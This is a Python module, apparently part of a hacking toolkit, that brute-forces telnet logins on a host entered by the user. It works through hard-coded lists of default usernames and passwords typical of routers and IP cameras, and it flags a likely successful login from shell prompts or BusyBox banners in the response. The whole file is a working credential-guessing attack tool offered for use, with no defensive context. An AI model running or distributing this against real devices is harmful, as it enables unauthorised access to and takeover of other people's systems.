# THIS MODULE WILL BE USED FOR BRUTEFORCING TELNET


# UI IMPORTS
from rich.console import Console
from rich.panel import Panel
from rich.live import Live 
console = Console()


# NETWORK IMPORTS
import telnetlib3, ipaddress
from telnetlib3 import Telnet


# ETC IMPORTS
import asyncio


# NSM IMPORTS
from nsm_vars import Variables


class Telnet_Brute_Forcer():
    """This will be used to bruteforce telnet"""


    @classmethod
    def _who(cls):
        """Who to bruteforce"""


        host = console.input(f"[bold green]Enter host: ").strip() or "192.168.1.172"
        port = console.input(f"[bold green]Enter port: ").strip()   or 23
        if not host: console.print("[bold red]Please enter a valid host")
        #host = ipaddress.ip_address(address=host)
        if not port: port = 22

        console.print(host, port)
        return host, port


    @classmethod
    async def _brute_forcer(cls, host, port, verbose=True):
        """Brute telnet"""

        usernames = [
            "root",
            "admin",
            "administrator",
            "user",
            "support",
            "guest",
            "service",
            "operator",
            "system",
            "camera",
            "ipc",
            "ipcam",
            "default",
            "maint",
            "maintenance",
            "debug",
            "test",
        ]

        passwords = [
            "",              # blank
            "admin",
            "root",
            "password",
            "12345",
            "123456",
            "12345678",
            "admin123",
            "root123",
            "support",
            "guest",
            "user",
            "camera",
            "ipcam",
            "default",
            "system",
            "service",
            "maint",
            "test",
        ]
        

        max_attempts = len(usernames) * len(passwords)
        attempt = 0
        errors = 0

        panel = Panel(renderable=f"Protocol Bruteforcing  -  Attempt: {attempt}/{max_attempts}", style="bold green", border_style="bold purple", expand=False)
        
        with Live(panel, console=console, refresh_per_second=4):
            for username in usernames:
                for password in passwords:

                    try:

                        if errors > 5: console.print("\n[bold red][-] MAX Errors Reached!"); exit()

                        creds = (f"Username: {username} - Password: {password}")

                        reader, writer = await telnetlib3.open_connection(host=host, port=port, connect_maxwait=1)
                        console.print("[bold yellow][*] Shell Activated!")
                        
                        
                        # INITAL RESPONSE
                        banner = await reader.read(1024)
                        if verbose and banner: console.print(banner)
                        

                        # SEND USERNAME
                        writer.write(username + "\n"); await asyncio.sleep(0.5)
                        resp1 = await reader.read(1024)
                        if verbose and resp1: console.print(resp1)
                        

                        # SEND PASSWORD
                        writer.write(password + '\n'); await asyncio.sleep(0.5)
                        resp2 = await reader.read(2048)
                        if verbose and resp2: console.print(resp2)

                        
                        writer.close()
                        
                        output = resp2.lower() if resp2 else ""
                        if any(x in output for x in ["welcome", "busybox", "last login", "#", "$"]):
                            console.print(f"[bold green][+] POSSIBLE VALID DEFAULT CREDS[bold yellow] → {username}:{password or '(blank)'}")
                            return True
                                            

                        console.print(f"[red]Raw Output:[/red] {output}")
                        console.print(f"[bold red][-] Invalid Credentials:[bold yellow] {creds}\n")


                        attempt += 1
                        panel.renderable = f"Protocol Bruteforcing  -  Attempt:[bold yellow] {attempt}/{max_attempts}[/bold yellow]  -  Developed by NSM Barii"
                    
                    

                    except Exception as e: console.print(f"[bold red]Exception Error:[bold yellow] {e}"); errors += 1


            

    @classmethod
    def main(cls):
        """Begin class"""

        if not Variables.telnet:
            return

        console.print("\n[bold green]  ===  Telnet Bruteforcer  ===\n")
        host, port = Telnet_Brute_Forcer._who()
        asyncio.run(Telnet_Brute_Forcer._brute_forcer(host=host, port=23))


if __name__ == "__main__":
    Telnet_Brute_Forcer.main()
